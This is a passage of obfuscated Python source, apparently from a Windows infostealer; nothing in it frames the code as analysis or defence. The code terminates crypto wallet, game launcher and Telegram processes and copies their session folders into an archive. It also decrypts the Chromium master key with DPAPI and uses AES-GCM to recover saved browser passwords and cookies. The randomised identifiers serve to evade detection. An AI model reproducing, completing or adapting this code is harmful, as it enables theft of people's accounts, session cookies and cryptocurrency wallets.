        ("Zerion",            os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(AOTZKNKKQBMWJKZTYVAXMFJPDMRCMIPBBVYWOYTWJOSBNRHUPGBLXPEBNSETGQGZGZAMPPNNFGNJEDAFOPDKZJZPE, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(RYSMRWSZCEKIVTQWNAXYZAIWAZCOCAHAHWAYJZREIOWSKAYENEJUEEKAKXAYKGEJWDXVXLATDOYATFJUFFWIBVKYABBGNJ,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_proc_name, v4r_type in WMKAPFXMIYWPTUURMLBCONDZNCRZJOMGAPLNAILSJJWHJPYGRKOZHIOFDGPZHULRIOQKOSNG:
            if v4r_type in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, v4r_proc_name, v4r_type in WMKAPFXMIYWPTUURMLBCONDZNCRZJOMGAPLNAILSJJWHJPYGRKOZHIOFDGPZHULRIOQKOSNG:
        if v4r_type in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ and os.path.exists(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
            try:
                if v4r_type == "Wallets" and CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI is not None:
                    CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI.append(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ)
                elif v4r_type == "Game Launchers" and IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS is not None:
                    IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS.append(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ)
                elif v4r_type == "Apps" and TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG is not None:
                    TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG.append(GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ)

                BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(os.path.join("Session Files", GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, "path.txt"), YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO)

                if os.path.isdir(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
                    for v4r_root, _, v4r_files in os.walk(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
                        for v4r_file in v4r_files:
                            VKZHOKIIBWDWEPZZZMXNXFQIBREBAVAZCJKSTUWDBUMZCMJTPOLI = os.path.join(v4r_root, v4r_file)
                            CMJFPLGAOSNLZXXNYVVUSXJKSVLZNSITTJIRICVDROISJRBEYIWVQCFYAYTBWTTMF = os.path.join(
                                "Session Files", GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, "Files",
                                os.path.relpath(VKZHOKIIBWDWEPZZZMXNXFQIBREBAVAZCJKSTUWDBUMZCMJTPOLI, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO)
                            )
                            try:
                                BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.write(VKZHOKIIBWDWEPZZZMXNXFQIBREBAVAZCJKSTUWDBUMZCMJTPOLI, CMJFPLGAOSNLZXXNYVVUSXJKSVLZNSITTJIRICVDROISJRBEYIWVQCFYAYTBWTTMF)
                            except:
                                pass
                else:
                    CMJFPLGAOSNLZXXNYVVUSXJKSVLZNSITTJIRICVDROISJRBEYIWVQCFYAYTBWTTMF = os.path.join("Session Files", GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ, "Files", os.path.basename(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO))
                    try:
                        BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.write(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, CMJFPLGAOSNLZXXNYVVUSXJKSVLZNSITTJIRICVDROISJRBEYIWVQCFYAYTBWTTMF)
                    except:
                        pass
            except:
                pass

    if "Wallets" in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ:
        CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI = ", ".join(CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI) if CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI else "No"
    if "Game Launchers" in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ:
        IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS = ", ".join(IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS) if IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS else "No"
    if "Apps" in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ:
        TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG = ", ".join(TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG) if TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG else "No"

    return CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI, IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS, TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG

def NDTBJPMJUIMTBSPSKEYLCNBGAFYRPPUHNYAXWPXHKOCCZHIWOZHSSWFGEIGVIWPEGZMAQYZDGRMKGXTGDIGJWXLSK(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS, FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ, WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI, FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK, KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF, PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE

    DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    GEBLFRLNBGLDQRXNXKFFJPSOVQXPWAKOJAMQZWTCIVTBKBBMQIMOBH = []

    if "extentions" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS = 0
    else:
        KXWMDENTRODMBBONQIACTTHKXYQXBWBKVTBZFOKHSDMWJMDCLRVMYUPMFIS = None

    if "passwords" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO = []
        FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ = 0
    else:
        GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO = ""
        FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ = None
    if "cookies" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH = []
        WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI = 0
    else:
        BHSOSIMMFFHXGLUPANDELKTNNDPYJLNLTRTZFNMOSDRSXXTYQJWVH = ""
        WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI = None
    if "history" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK = []
        FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK = 0
    else:
        YYVJUYIAMXFGVSWAEYTCHNSHLIOHZFPQPBSEKXTEGYWMYQNKECLLEFPSZBFHTYHNFXXTLOAUK = ""
        FGAWRSBTJJOCBDBEQKKRXNTRINKASWQCARWLJHURTCUIRESYUPNEUHFQBVUWPHKRXDUELSLERYTTMXFSKSIK = None
    if "downloads" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC = []
        KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF = 0
    else:
        VMNETNYFVUCYOYEBSVBZVAWBDWUAYOEGSMIXDZEPOGEXJTYSPYCJYWHGGGCXYZMKEOHMVCZRXJLISOGVERC = ""
        KSGGLTPYPNERECKZBJCCCNRECEYUQSYPBAEEYCJBQDDJJVBFPXOMYQITONAFOZNHYQKSGOFTYHKGQGZWFLTRF = None
    if "cards" in DUUWZZVBPCWSVJSWVHPSKDCQHZPXCVQWNSLBGGPUKQMZMNUAZPX:
        GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR = []
        PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE = 0
    else:
        GWYGINKOADFBAKSNJCQHCZIPKBQSFGGCBKJNBFAWMXGFREHYVYMMLWYDYTMXKSRCEJXEURUKR = ""
        PTDCJYGBMXGRBVIUTDWJJUZVMPVDKLLCRBGGQSNUDQKDADDQWTLXUFKNRGYZRGVFE = None
    
    def LKLONIPBLTJZDBIKGOPTZXGFJWNZBGEYKLERPZCTBHSRFUYATVGQYVFPJSFQAYMXPUZFGHISTLZNADOWRBWUBIULJPX(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
        if not os.path.exists(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
            return None

        try:
            with open(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO, 'r', encoding='utf-8') as v4r_f:
                GPCLIGCTELGGEMAMPPPMLIDVNDUIVSJESNRTMPTXHISKXFDBZJGUBLRMWYOHCBWD = json.load(v4r_f)

            ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_key = base64.b64decode(GPCLIGCTELGGEMAMPPPMLIDVNDUIVSJESNRTMPTXHISKXFDBZJGUBLRMWYOHCBWD["os_crypt"]["encrypted_key"])[5:]
            XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY = win32crypt.CryptUnprotectData(ODEJAYLGGWUBLLQWMPQVFQGXCNBURIFELEYDGWZVPHEJNTAEGJJROSCELBECCZBCDLH_key, None, None, None, 0)[1]
            return XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY
        except:
            return None

    def OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSH(MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY):
        try:
            QLKTXILHSLSJTCQDFBWTAKRRYNBASLIJLMPOKDDAGGMVNTNLDOVTGGOCZIAJAQRPJIQDDYUALHEUT = MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS[3:15]
            EYOMEAEDDNIRPRRRGCDCEOVXVJSOSUMXBLTLRGOYXVANCILLNCZXZNSCVBKLCTYODKWXZBTOWWPPBYBCT = MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS[15:-16]
            JCJCHIZYKSZAPTJHJDANYZYJLSGHSYSJTCFTWFJBIZEUUXLBPMHYXPTAQPTDFKVJZKWTZEODBNNKWUCYXPMGHSLXFKJPKM = MZZCONAQTUBFNOOLFCTETIGJRINQSNFHGIGUTKPOHNVVPUWPVVNZCNBRBJDGMWORZOTWCQWEHBRSFMXQLODTKBITRS[-16:]
            GHSCSCPVNYFSGOANGCAOVLQMMTNJQCGLHLJVDNRRBOPNNIOYTVSXNFOHOVVUYLVUQMOFVMKH = Cipher(algorithms.AES(XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY), modes.GCM(QLKTXILHSLSJTCQDFBWTAKRRYNBASLIJLMPOKDDAGGMVNTNLDOVTGGOCZIAJAQRPJIQDDYUALHEUT, JCJCHIZYKSZAPTJHJDANYZYJLSGHSYSJTCFTWFJBIZEUUXLBPMHYXPTAQPTDFKVJZKWTZEODBNNKWUCYXPMGHSLXFKJPKM))
            LPFPLMJWMZGSVEOBQFYVMCJRMURKZCUBQXXBBWMBZHDNJOUQLTISVBPRABDRQMQTKYZCKROMWDGDVZNAHO = GHSCSCPVNYFSGOANGCAOVLQMMTNJQCGLHLJVDNRRBOPNNIOYTVSXNFOHOVVUYLVUQMOFVMKH.decryptor()
            MWBISVUQEXITUBFXYYXMOTSTFYEZXMXTEEWDZPRPXUDCXTOJGNWDNDSCEHFFRWPQLFEYNLWAFTAKKTFJBEYPEXMOTCPYSJDOJHK = LPFPLMJWMZGSVEOBQFYVMCJRMURKZCUBQXXBBWMBZHDNJOUQLTISVBPRABDRQMQTKYZCKROMWDGDVZNAHO.update(EYOMEAEDDNIRPRRRGCDCEOVXVJSOSUMXBLTLRGOYXVANCILLNCZXZNSCVBKLCTYODKWXZBTOWWPPBYBCT) + LPFPLMJWMZGSVEOBQFYVMCJRMURKZCUBQXXBBWMBZHDNJOUQLTISVBPRABDRQMQTKYZCKROMWDGDVZNAHO.finalize()
            return MWBISVUQEXITUBFXYYXMOTSTFYEZXMXTEEWDZPRPXUDCXTOJGNWDNDSCEHFFRWPQLFEYNLWAFTAKKTFJBEYPEXMOTCPYSJDOJHK.decode()
        except:
            return None
        
    def EVBBKBJWKNOCLWORLHAKQZGXMSJCMIUULGQAXHKUQPGAWFEIRVBCCFIIPLCGIS(RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY):
        global FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ
        BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED_db = os.path.join(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, 'Login Data')
        if not os.path.exists(BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED_db):
            return

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC = sqlite3.connect(":memory:")
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ = sqlite3.connect(BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED_db)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.backup(XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.close()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN = XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.cursor()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ =          f"- Url      : {v4r_row[0]}"
            LCDLPHNRZRWRBKIJMKDYQEYSZBPQFYRMRRRHCBPJKXCLHIRPPGNUQABTPIWUNTDHQEOQGUQRULXZFZ =     f"  Username : {v4r_row[1]}"
            BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED =     f"  Password : {OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSH(v4r_row[2], XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY)}"
            RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name = f"  Browser  : {RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS}"
            GADSLHVMPAEHVZTWXGZQCGTIOPYUHJLIAYWBHPHRAADSYPMTGDAYGSOCEMOHODLWO.append(f"{WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ}\n{LCDLPHNRZRWRBKIJMKDYQEYSZBPQFYRMRRRHCBPJKXCLHIRPPGNUQABTPIWUNTDHQEOQGUQRULXZFZ}\n{BKOYSQIXIMJCZMTTTRKZNINXGIXUPUTZBBXYKCIWFEHZNRSIYRGFJCTEGYCLGBPZRVED}\n{RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS_name}\n")
            FVMPTXUPBJAZIZSCOKDEGXDTDRYKJAUSWMTSPGWAKEZUJDZRSQCHZFHLETSSOEKOWPHQMRSRVUJHGPMEYQ += 1

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.close()

    def WCVKMALLNXDDJJWVFQPYKBBWGBAFNWHBUTFOVMVFYKYUJTYOYBRUBHWFHGPVZNYIZEZUBSNPKEFMQGMWNBIQGGRH(RNKPIMGHMYHQCFHGOXORHWARFXMPCQPBCICDBOQMNHSAYXAVGLEKXKLIYFTWJAHLUEZIYLJMAPSDQXRS, XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY):
        global WQZLIJYQXTGWJWSDKFNFRKZDBOWYXZHYOFOYKXLWEGPQIJWLQTKYKBGXYOXOMLVQAIHGBTMUGWVSNACSYEYBSQI
        ZSVAUBQMESQSJJITKGCGBPDCTLMHGQJODENUGZPMZEYPPCSGUYLMYKDBTZNZGMRJFYOXZESMBMODGYVYKJAQODZAID = os.path.join(XCTSLJBZOVEMVZOIJNSQQJYPNEIYQHPIHGLCFDANTZMWVHGFIMNEHBBT, 'Network', 'Cookies')
        if not os.path.exists(ZSVAUBQMESQSJJITKGCGBPDCTLMHGQJODENUGZPMZEYPPCSGUYLMYKDBTZNZGMRJFYOXZESMBMODGYVYKJAQODZAID):
            return

        XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC = sqlite3.connect(":memory:")
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ = sqlite3.connect(ZSVAUBQMESQSJJITKGCGBPDCTLMHGQJODENUGZPMZEYPPCSGUYLMYKDBTZNZGMRJFYOXZESMBMODGYVYKJAQODZAID)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.backup(XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC)
        FFNUBYMERQYKNQUDAMILGGZUPXSGLVSQTOGFRJGWZAMIBVLUVKAQSLNQUOUXSMGCKWOAXZXLOZ.close()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN = XWGGAUODWMNKNKHKIWTWTBKBNRSOWPHYHNXHBRQQDVWZJMMNRQZDRWWXXWWFBUVXDUNC.cursor()
        QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in QTVXQDDLCDTVETGKTOBSOBQVZNQCPYEPHUJMXYEOWWTTGIVDBTXIUVWVYLBPN.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            WQGGXVIPUQVNCFOANOBLRARCMLXJKZFRBCQUMCAWDBUBGHOKYRYQULBMUCDFXRKDWWICAORJPUTPXGUELWZ =          f"- Url     : {v4r_row[0]}"
            GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ =         f"  Name    : {v4r_row[1]}"
            YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO =         f"  Path    : {v4r_row[2]}"
            KGOKJFPPBAYLMGDRERSMOUJLCKXYFPGOVYUEDWBNQHXFEAKRVJWUMOXADKXEULCSGQPMF =       f"  Cookie  : {OGPEXAMMLQCTCCGKKRBMDMPUBJWXMJBVVZVRUWRAWRGQGJDKPSCORUDUAPTQHASCPOMCLZXCPCSH(v4r_row[3], XCFCEOMFKGSVXTGBMYDUIIFCOVQLTCXAIYRZCAHGCUHDEODAOZIPMGRMXMBZWBOBEKDXRDHZNHFY)}"
            UDGNSUAOHBPSHVGHAFVHJWLQWROWGKPCPHYCATBNWGGGEJBYOMZZITODBFESLLNTTEECMMXOZEKSJCLY =       f"  Expire  : {v4r_row[4]}"
